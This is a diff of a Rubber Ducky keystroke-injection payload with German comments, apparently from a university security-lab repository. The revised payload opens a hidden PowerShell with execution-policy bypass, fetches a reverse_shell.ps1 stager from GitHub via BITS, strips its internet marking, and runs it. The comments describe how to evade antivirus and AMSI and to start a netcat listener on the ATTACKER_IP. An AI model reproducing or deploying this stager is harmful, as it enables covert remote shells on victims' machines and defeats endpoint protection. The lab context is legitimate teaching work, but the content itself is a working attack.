@@ -7,13 +7,19 @@ REM  WICHTIG: ATTACKER_IP und PORT in reverse_shell.ps1 eintragen,
 REM  committen und pushen - Script zieht immer aktuelle Version.
 REM  Listener starten: nc -lvp 4444
 REM
-REM  AV-Evasion:
-REM    - cmd.exe Elternprozess (explorer->cmd->ps, nicht explorer->ps)
-REM    - [scriptblock]::Create() statt IEX (AMSI-Hook umgehen)
-REM    - URL in $u isoliert: trennt Download-Aufruf von Execute
+REM  AV-Evasion / Reliability:
+REM    - %ComSpec% = voller Pfad zu cmd.exe (immer gefunden)
+REM    - BITS (Background Intelligent Transfer Service) statt
+REM      WebClient + IEX/scriptblock (AMSI-Hook umgehen)
+REM    - BITS nutzt Windows-eigenen Download-Dienst (Windows Update),
+REM      selten von AV geflaggt
+REM    - Kein IEX, kein scriptblock, kein WebClient im Run-Befehl
+REM    - Unblock-File entfernt Zone.Identifier ADS (Internet-Markierung)
+REM    - Temp-Datei bleibt waehrend Shell aktiv (kein -ri bei Shells)
+REM    - AMSI-Bypass + String-Obfuskierung im PS1-Script selbst
 REM ============================================================
 
 DELAY 2000
 GUI r
-DELAY 600
-STRINGLN cmd /c powershell -nop -noni -w h -ep bypass -c "$u='https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/reverse_shell.ps1';& ([scriptblock]::Create([Net.WebClient]::new().DownloadString($u)))"
+DELAY 1000
+STRINGLN %ComSpec% /c powershell -nop -ep bypass -w h -c "Import-Module BitsTransfer;Start-BitsTransfer 'https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/reverse_shell.ps1' $env:TEMP\r.ps1;Unblock-File $env:TEMP\r.ps1;& $env:TEMP\r.ps1;ri $env:TEMP\r.ps1 -f -ea 0"
